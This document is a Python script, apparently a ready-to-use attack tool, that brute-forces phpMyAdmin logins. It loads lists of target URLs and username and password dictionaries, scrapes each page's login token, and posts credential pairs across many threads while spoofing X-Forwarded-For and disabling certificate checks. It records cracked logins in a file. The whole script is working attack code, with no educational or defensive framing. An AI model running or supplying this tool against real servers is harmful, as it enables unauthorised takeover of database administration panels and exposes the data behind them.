#!/usr/bin/python3
#coding: utf-8

import requests
import argparse
import threading
import time
import re

def urls(path):
	with open(path,'r') as f:
		urls = f.readlines()
		return urls

def log(log):
	with open('log.txt','a+',encoding='utf-8') as f:
		f.write(log + '\n')
	return log

def ok(ok):
	with open('ok.txt','a+',encoding='utf-8') as f:
		f.write(ok + '\n')
	return ok

def connect(url,proxies):
	headers = {"Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","Accept-Encoding":"gzip, deflate","X-Forwarded-For":"127.0.0.1"}
	requests.packages.urllib3.disable_warnings()
	i = 2
	while i != 0:
		if 'https://' in url or 'http://' in url:
			try:
				response = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=60)
				return url
			except Exception as e:
					i = i - 1
					error = str(e)
					time.sleep(2)
		else:
			url = 'https://' + url
			try:
				response = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=60)
				return url
			except:
				url = url.replace('https://','http://')
				try:
					response = requests.get(url=url,headers=headers,proxies=proxies,timeout=60)
					return url
				except Exception as e:
					url = url.replace('http://','')
					i = i - 1
					error = str(e)
					time.sleep(2)
	print(url + ' ----- 连接出错！')
	log(url + ' ----- 连接出错 ----- ' + error)
	return ''

def un(path):
	with open(path,'r') as f:
		uns = f.readlines()
		return uns

def pw(path):
	with open(path,'r') as f:
		pws = f.readlines()
		return pws

def poc(url,un,pwd,proxies):
	headers = {"Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","Accept-Encoding":"gzip, deflate",'Accept-Language':'zh-CN,zh;q=0.9,ga;q=0.8,en;q=0.7',"X-Forwarded-For":"127.0.0.1",'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Content-Type':'application/x-www-form-urlencoded'}
	requests.packages.urllib3.disable_warnings()
	session = requests.session()
	try:
		response1 = session.get(url=url,headers=headers,proxies=proxies,verify=False)
	except:
		print(log(url+'  连接出错1 '+un+' '+pwd))
		return ''
	try:
		token = re.search('<input type="hidden" name="token" value=".*?"',response1.content.decode()).group().replace('<input type="hidden" name="token" value="','').replace('"','')
	except:
		token = ''
	try:
		setsession = re.search('<input type="hidden" name="set_session" value=".*?"',response1.content.decode()).group().replace('<input type="hidden" name="set_session" value="','').replace('"','')
	except:
		setsession = ''
	if setsession != '':
		data = 'set_session=' + setsession + '&pma_username=' + un + '&pma_password=' + pwd + '&server=1&target=index.php&token=' + token
	else:
		data = 'pma_username=' + un + '&pma_password=' + pwd + '&server=1&target=index.php&token=' + token
	url = url.rstrip('/') + '/index.php'
	try:
		response2 = session.post(url=url,headers=headers,proxies=proxies,verify=False,data=data)
	except:
		print(log(url+'  连接出错2 '+un+' '+pwd))
		return ''
	if '无法登录 MySQL 服务器' not in response2.text and response2.status_code == 200 and 'input_username' not in response2.text and 'input_password' not in response2.text:
		print(ok('ok ' + url + ' ' + un + ' ' + pwd))
		return 'ok'
	else:
		return ''

def bp(url,username,password,usernames,passwords,proxies):
	if username != None and password != None:
		result = poc(url,username,password,proxies)
		if result == '':
			print(log(url+'    爆破失败'))

	if usernames != None and passwords != None:
		for un in usernames:
			un = un.replace('\n','')
			for pwd in passwords:
				pwd = pwd.replace('\n','')
				result = poc(url,un,pwd,proxies)
				if result != '':
					break
			if result != '':
				break
		if result == '':
			print(log(url+'    爆破失败'))
		
	if username != None and passwords != None:
		for pwd in passwords:
			pwd = pwd.replace('\n','')
			result = poc(url,username,pwd,proxies)
			if result != '':
				break
		if result == '':
			print(log(url+'    爆破失败'))

	if usernames != None and password !=None:
		for un in usernames:
			un = un.replace('\n','')
			result = poc(url,un,password,proxies)
			if result != '':
				break
		if result == '':
			print(log(url+'    爆破失败'))

def pl(url,username,password,usernames,passwords,proxies,se):
	se.acquire()
	url = connect(url,proxies)
	if url != '':
		bp(url,username,password,usernames,passwords,proxies)
	se.release()

if __name__ == '__main__':

	ap = argparse.ArgumentParser()
	ap.add_argument('-u','--url',help='xx.com or http://xx.com')
	ap.add_argument('-f','--file',help='file path')
	ap.add_argument('-user','--username',help='one username')
	ap.add_argument('-pwd','--password',help='one password')
	ap.add_argument('-un','--usernames',help='username zidian path')
	ap.add_argument('-pw','--passwords',help='password zidian path')
	ap.add_argument('-p','--proxy',help='http://127.0.0.1:8080')
	ap.add_argument('-t','--thread',help='xiancheng 10',type=int,default=10)
	args = vars(ap.parse_args())

	if args['username'] != None:
		username = args['username']
		usernames = None
	elif args['usernames'] != None:
		usernames = un(args['usernames'])
		username = None
	else:
		print('请输入用户名或用户名字典！')
		exit()

	if args['password'] != None:
		password = args['password']
		passwords = None
	elif args['passwords'] != None:
		passwords = pw(args['passwords'])
		password = None
	else:
		print('请输入密码或密码字典！')
		exit()

	if args['proxy'] != None:
		proxies = {'http':args['proxy'],'https':args['proxy']}
	else:
		proxies = {}

	if args['file'] != None:
		se = threading.BoundedSemaphore(args['thread'])
		for u in urls(args['file']):
			u = u.replace('\n','')
			t = threading.Thread(target=pl,args=(u,username,password,usernames,passwords,proxies,se,))
			t.start()

	if args['url'] != None:
		url = connect(args['url'],proxies)
		if url != '':
			bp(url,username,password,usernames,passwords,proxies)
